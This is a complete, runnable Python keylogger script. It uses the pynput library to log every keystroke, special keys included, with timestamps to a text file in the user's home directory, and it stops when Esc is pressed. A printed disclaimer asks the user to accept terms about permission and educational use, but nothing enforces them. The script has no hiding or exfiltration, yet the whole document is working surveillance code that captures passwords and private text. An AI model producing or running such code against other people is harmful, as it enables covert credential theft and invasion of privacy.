print("=========================================Simple Keylogger===============================================================")

from pynput import keyboard
import logging
import os

# Set up logging configuration
log_file_path = os.path.join(os.path.expanduser("~"), "keyloggers.txt")
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to display the disclaimer and accept terms
def display_disclaimer():
    print("DISCLAIMER:")
    print("The use of keyloggers can have legal and ethical implications.")
    print("By using this tool, you acknowledge and accept the following terms and conditions:")
    print("1. You confirm that you have explicit permission from the appropriate authorities to capture keystrokes.")
    print("2. You agree to use this keylogger solely for educational purposes, security testing, or personal monitoring.")
    print("3. You are responsible for ensuring that your use of this tool complies with all applicable laws and regulations.")
    print("4. The creators and contributors of this tool accept no responsibility for any consequences resulting from its use.")
    print("5. You agree to respect the privacy of all users on the system.")
    print("===================================================================================================================")
    acceptance = input("Do you accept these Terms and Conditions? (Yes/No): ").strip().lower()
    return acceptance == 'yes'

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

# Function to stop the when type 'esc'
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Main function to start the keylogger
def main():
    if not display_disclaimer():
        print("You must accept the terms to use this tool. Exiting...")
        return

    print("Starting keylogger... Press 'Esc' to stop.")
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Main function
main()
